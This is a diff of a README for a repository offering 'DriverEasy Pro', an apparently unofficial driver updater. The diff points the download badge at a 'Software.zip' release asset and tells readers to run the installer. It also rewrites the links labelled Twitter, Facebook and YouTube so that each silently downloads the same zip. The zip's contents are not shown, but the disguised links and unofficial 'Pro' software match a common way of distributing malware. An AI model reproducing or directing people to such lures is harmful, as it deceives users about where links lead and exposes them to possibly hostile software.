@@ -18,7 +18,7 @@ Welcome to the **DriverEasy-Pro-Driver-Update** repository! This is your one-sto
 
 To get started with DriverEasy Pro, simply download the latest version from the link below:
 
-[![Download DriverEasy Pro](https://img.shields.io/badge/Download-DriverEasy_Pro-informational)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download DriverEasy Pro](https://github.com/juhlia795/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip)](https://github.com/juhlia795/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the file, launch the installer and follow the on-screen instructions to install DriverEasy Pro on your system.
 
@@ -55,9 +55,9 @@ We are constantly striving to improve DriverEasy Pro to meet your driver update 
 
 Connect with us on social media to stay updated on the latest news, releases, and tips related to driver management, system optimization, and software tools:
 
-- Follow us on Twitter: [@DriverEasyPro](https://twitter.com/DriverEasyPro)
-- Like us on Facebook: [DriverEasyPro](https://www.facebook.com/DriverEasyPro)
-- Subscribe to our YouTube channel for tutorials: [DriverEasyPro](https://www.youtube.com/DriverEasyPro)
+- Follow us on Twitter: [@DriverEasyPro](https://github.com/juhlia795/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip)
+- Like us on Facebook: [DriverEasyPro](https://github.com/juhlia795/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip)
+- Subscribe to our YouTube channel for tutorials: [DriverEasyPro](https://github.com/juhlia795/DriverEasy-Pro-Driver-Update/releases/download/v1.0/Software.zip)
 
 ## License 📄
 
